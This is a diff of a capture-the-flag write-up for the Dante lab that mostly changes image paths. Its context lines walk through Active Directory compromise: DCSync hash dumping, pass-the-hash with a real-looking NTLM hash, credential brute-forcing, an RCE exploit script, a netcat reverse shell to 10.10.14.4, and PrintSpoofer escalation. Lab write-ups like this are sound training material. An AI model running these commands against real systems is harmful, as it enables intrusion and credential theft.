-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 So our goal here is to get `Administrator`. Let's look at the Pathfinding menu. Set the starting node as `jbercov` and the end node as `Administrator`.
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 So over here, we can notice that `jbercov` has DCsync and WriteGPLink rights to the domain. DCsync is a method of replicating the domain by simulating the DC to retrieve the password hashes. WriteGPLink is a bit complicated way to modify GPOs for privilege escalation.
 
@@ -2901,7 +2901,7 @@ The easiest method to exploit this would be using impacket's `secretsdump` to pe
 impacket-secretsdump -just-dc DANTE/jbercov@172.16.2.5
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice, we basically have full domain compromise with the dumped hashes. We can even forge Golden Tickets.
 
@@ -2911,7 +2911,7 @@ Now, log into Administrator using `evil-winrm` by passing the hash
 evil-winrm -i 172.16.2.5 -u Administrator -H "4c827b7074e99eefd49d05872185f7f8"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 Get the flag in Desktop folder
 
@@ -2925,13 +2925,13 @@ Get the flag in Desktop folder
 
 There's a note in the same directory
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 Huh... well guess I missed that one.
 
 There was also a Jenkins.bat file in the Documents folder
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then I remembered the Jetty login page where we were stuck before. Let's download the .bat file and head back to the website
 
@@ -2941,7 +2941,7 @@ After that was done, I did a check for additional host IP's and found nothing, w
 netstat -an | findstr "172.16."
 ```
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
 
 But I found an alternative which was to use this one liner ping sweep:
 
@@ -2957,7 +2957,7 @@ This utility can also be used to pass hashes for authentications
 impacket-psexec DANTE/Administrator@172.16.2.5 -hashes aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Great, now we can use that one liner ping sweep
 
@@ -2965,7 +2965,7 @@ Great, now we can use that one liner ping sweep
 (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 As we can see there is an internal subnet replying. This is good but we have another problem, because the internal subnet can only be accessed through the DC01 machine, we need to pivot again and add a new route. So this is basically triple pivoting
 
@@ -3498,19 +3498,19 @@ We see here FTP on port `21` has a Filezilla Server version 0.9.60. SMB on ports
 
 Let's start by checking the FTP to see if there any exploits for the Filezilla Server
 
-<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>
 
 No directs access exploits. Let's try brue-forcing with the list of credentials we received earlier
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 Separate them into a wordlist users in `users.txt` and passwords in `passwords2.txt.` We can bruteforce using `hydra`
 
 I tried using `hydra` and also `medusa` to bruteforce but it didn't work, I thought I was blocked for too many attempts...
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
 
 So, I ended up using Metasploit's built in FTP bruteforce
 
@@ -3526,21 +3526,21 @@ msf6 auxiliary(scanner/ftp/ftp_login) > exploit
 
 Cool we have a hit on`dharding:WestminsterOrange5`
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
 
 Looking inside there is a file `Remote login.txt`  . Download it on our machine
 
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
 
 `James` is talking abaout a changed password, maybe this is a hint for the SMB logins?.
 
 Let's move on to the SMB ports
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
 
 Based on the previous txt file, we can conclude that the user is possibly the same but the password, `WestminsterOrange5` was changed to a different character/number. Let's modify the password and make a list of different characters.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's use these first and try to bruteforce using `nxc`
 
@@ -3548,7 +3548,7 @@ Let's use these first and try to bruteforce using `nxc`
 nxc smb 172.16.1.101 -u dharding -p passwords3.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice!! we have a hit on `dharding:WestminsterOrange17`. Let us now enumerate the SMB shares
 
@@ -3556,7 +3556,7 @@ Nice!! we have a hit on `dharding:WestminsterOrange17`. Let us now enumerate the
 nxc smb 172.16.1.101 -u dharding -p 'WestminsterOrange17' --shares
 ```
 
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>
 
 Okay so, we enumerated the available shares but it seems `dharding` doesn't have any permissions over the `ADMIN$` and `C$` shares. Let's try to log in directly into dharding's account using `evil-winrm`
 
@@ -3564,7 +3564,7 @@ Okay so, we enumerated the available shares but it seems `dharding` doesn't have
 evil-winrm -i 172.16.1.101 -u dharding -p "WestminsterOrange17"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice, that worked. Let's get the flag in Desktop
 
@@ -3767,7 +3767,7 @@ Nmap done: 256 IP addresses (11 hosts up) scanned in 877.76 seconds
 
 We can see here were are dealing with a Windows machine with ports HTTP, SMB MYSQL and RDP...this could be a clue on how we could get in and gain access. Let's check the HTTP web server
 
-<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 A marriage registration system huh...Like previous methods, try to look for some available exploits. I found this one in exploitDB
 
@@ -3780,7 +3780,7 @@ possibility of automatic registration and execution of any command without needi
 
 The script registers a different phone.no everytime while having the `-c` flag to execute remote commands. Let's try it!
 
-<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice, from here we can straight up ge the flag
 
@@ -3788,7 +3788,7 @@ Nice, from here we can straight up ge the flag
 python3 marriage.py -u http://172.16.1.102:80/ -c 'type C:\Users\blake\Desktop\flag.txt'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
 
 26th flag: `DANTE{U_M4y_Kiss_Th3_Br1d3}`
 
@@ -3808,7 +3808,7 @@ Verify it worked by listing directories
 python3 marriage.py -u http://172.16.1.102:80/ -c 'dir'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
 
 Open a listener and execute the executable to make a callback
 
@@ -3816,7 +3816,7 @@ Open a listener and execute the executable to make a callback
 python3 marriage.py -u http://172.16.1.102:80/ -c 'nc64.exe 10.10.14.4 1234 -e cmd.exe'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>
 
 Callback received. Now check for privileges
 
@@ -3824,7 +3824,7 @@ Callback received. Now check for privileges
 whoami /all
 ```
 
-<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see here an easy win because `SeImpersonatePrivilege` is enabled. The `SeImpersonatePrivilege` is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account. This privilege allows a process to assume the identity of a different user, enabling it to perform actions or access resources as if it were that user.
 
@@ -3845,7 +3845,7 @@ Execute it and spawn a Powershell
 ./PrintSpoofer64.exe -i -c powershell
 ```
 
-<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>
 
 Boom, another SYSTEM session. Get the flag in Administrator's Desktop folder
 
